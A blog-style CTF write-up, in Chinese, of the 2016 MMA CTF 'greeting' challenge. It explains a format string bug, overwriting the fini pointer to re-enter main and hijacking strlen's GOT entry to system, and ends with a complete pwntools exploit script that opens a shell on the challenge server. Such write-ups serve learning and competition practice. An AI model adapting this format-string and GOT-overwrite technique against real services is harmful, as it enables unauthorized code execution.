title: '[MMA CTF 2nd 2016] greeting'
tags:
    - format string
    - GOT hijacking
categories:
    - write-ups
date: 2016-09-06 20:33:00
---

## Description

> 程式很簡單小小的，存在 `format string` 的洞，但是卻不知道要怎樣利用，call 完 `printf` 就沒在 call 其他 function 了，然後發現有 `stack guard` 的保護，於是一直想辦法去寫爛 `canary` 然後順便把 `__stack_chk_fail` GOT hijack掉，但是想了各種方法，都失敗Orz，想過用類似 BP chain 的方式把它寫爛，但是他只讀 64bytes 實在是不夠用....
> 只能說自己經驗太少，只會往自己玩過方向走QQ，從早上看到下午都在鑽那些不能的點實在太菜了... 後來有了**@leepupu**的提示--> overwrite `fini` 才繼續解這題@@

`fini` 是一個 call 完 `main` 之後會呼叫的 function，他的 function address 在 `.bss`段，我一開始還在想要做 ROP 後來發現太麻煩了，然後這時候 trello 通知跳出來＠＠ **@bananaapple** 把作法貼了上去，不小心讀了通知，才發現他那樣做簡單又方便QQ 我的想法太蠢QQ

## Exploit

在 `getnline` 這個 function 裡頭的最後一段 code 是長這樣的：

~~~c
return strlen(s)
~~~

s 是我們輸入的 input 儲存的 char array 開頭，所以目標就是把 `fini` 改寫成 main 讓他再跑一次，然後順便改寫 `strlen` 的 GOT，改成 `system` 這麼一來 return to main 之後 input 輸入 sh，這樣一來在上面那段 return 前 就會變成 `system('sh')` shell就開起來了@@

有一點要注意的是因為他可讀的大小只有 64 bytes，所以一次改 2bytes 才不會改不完而造成程式 crash。

我的 exploit 是後來改成讓程式自己算 padding 長度，其實可以直接開 `ipython` 或啥的計算機手算也蠻快的@@

`return to main` 真好用QQ

## Final Exploit:

```python
#!/usr/bin/env python

from pwn import *

r = remote('127.0.0.1', 4000)
#r = remote('pwn2.chal.ctf.westerns.tokyo', 16317)

raw_input('#')

main = 0x080485ed
system = 0x8048490
strlen_got = 0x08049a54
fini = 0x08049950

payload = 'AA' # padding
payload += p32(strlen_got+2) # put this in first since the higher bytes i want is 0x0804 which is smaller than 0x8490 
payload += p32(strlen_got) 
payload += p32(fini) # since the address of fini is 0x0804xxxx so we just have to change its lower 2 bytes -> 0x85ed

printed = 20 + 4*3

def pad(func, p, low_or_high):
    if low_or_high != 0:
        return ((((func) & 0xffff) - p) % 0xffff + 0xffff) % 0xffff
    else :
        return ((((func >> 2*8) & 0xffff) - p) % 0xffff + 0xffff) % 0xffff

for i in range(3):
    if i < 2:
        f = system
    else :
        f = main
    padding = pad(f, printed, i)
    if padding > 0:
        payload += '%%%dc' % (padding)
    payload += '%%%d$hn' % (12+i)
    printed += padding

r.sendline(payload)

r.sendline('sh\x00')

r.interactive()
```

還有很多要學，加油吧。
